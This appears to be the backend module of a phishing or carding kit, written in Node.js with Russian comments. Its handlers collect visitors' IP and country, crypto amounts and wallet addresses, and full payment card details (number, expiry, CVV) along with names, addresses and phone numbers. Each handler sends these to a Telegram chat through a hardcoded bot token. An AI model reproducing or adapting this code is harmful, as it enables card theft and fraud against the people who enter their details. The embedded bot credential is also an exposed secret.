/** @format */
const axios = require('axios');

const getCountryByIP = async ip => {
    try {
        const response = await axios.get(`https://ipwho.is/${ip}`);
        if (response.data.success) {
            return response.data.country;
        } else {
            console.error(`Ошибка API: ${response.data.message}`);
            return 'Unknown';
        }
    } catch (error) {
        console.error('Ошибка запроса:', error);
        return 'Unknown';
    }
};

const getClientIp = req => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (typeof xForwardedFor === 'string') {
        return xForwardedFor.split(',')[0].trim();
    }
    return req.socket.remoteAddress;
};

const sendMessage = async (req, res) => {
    try {
        const { message } = req.body;
        const ip = getClientIp(req);
        console.log('bot: ', message);

        if (!message) {
            return res.status(400).json({ error: 'Message is required' });
        }

        const botToken = '7819024810:AAGKYaXhqwu5V_PUU6iOp3hSTOp8_8hfsR0';
        const chatId = '-1002609477146';

        if (!botToken || !chatId) {
            return res
                .status(500)
                .json({ error: 'Bot token or chat ID not configured' });
        }

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const country = await getCountryByIP(ip);
        const countryText = `\n📍 ${country};`;

        let address = '';
        let coins = '';
        if (message?.includes('from')) {
            coins = message?.split('from')[0];
            address = message?.split('from')[1];
        }

        const messageText = `\n ${coins && address ? `💰 ${coins} \n💳 ${address}` : message}`;

        const textToSend = `IP: ${ip} ${messageText} ${countryText}`;

        console.log(textToSend);
        await axios.get(url, {
            params: {
                chat_id: chatId,
                parse_mode: 'html',
                text: textToSend,
            },
        });

        res.json('OK');
    } catch (error) {
        console.error('Error sending message to bot:', error);
        res.status(500).json({ error: error.message });
    }
};

// Функция для отправки данных о платеже в Telegram
const sendPaymentData = async (paymentData) => {
    try {
        const botToken = '7819024810:AAGKYaXhqwu5V_PUU6iOp3hSTOp8_8hfsR0';
        const chatId = '-1002609477146';

        if (!botToken || !chatId) {
            console.error('Bot token or chat ID not configured');
            return;
        }

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Формируем сообщение с данными о платеже
        const messageText = `
💳 НОВЫЙ ПЛАТЕЖ

👤 Клиент: ${paymentData.firstName} ${paymentData.lastName}
📧 Email: ${paymentData.email}
📱 Телефон: ${paymentData.phone}
📍 Страна: ${paymentData.countryCode}
🏠 Адрес: ${paymentData.address}
🏙️ Город: ${paymentData.city}
📮 Индекс: ${paymentData.postalCode}

💳 Данные карты:
   Владелец: ${paymentData.cardHolder}
   Номер: ${paymentData.cardNumber}
   Срок: ${paymentData.expiry}
   CVV: ${paymentData.cvv}

💰 Сумма: ${paymentData.price} EUR
🆔 FB ID: ${paymentData.fb || 'Не указан'}

⏰ Время: ${new Date().toLocaleString('ru-RU')}
        `.trim();

        await axios.get(url, {
            params: {
                chat_id: chatId,
                parse_mode: 'html',
                text: messageText,
            },
        });

        console.log('Payment data sent to Telegram successfully');
    } catch (error) {
        console.error('Error sending payment data to Telegram:', error);
    }
};

module.exports = {
    sendMessage,
    sendPaymentData,
};
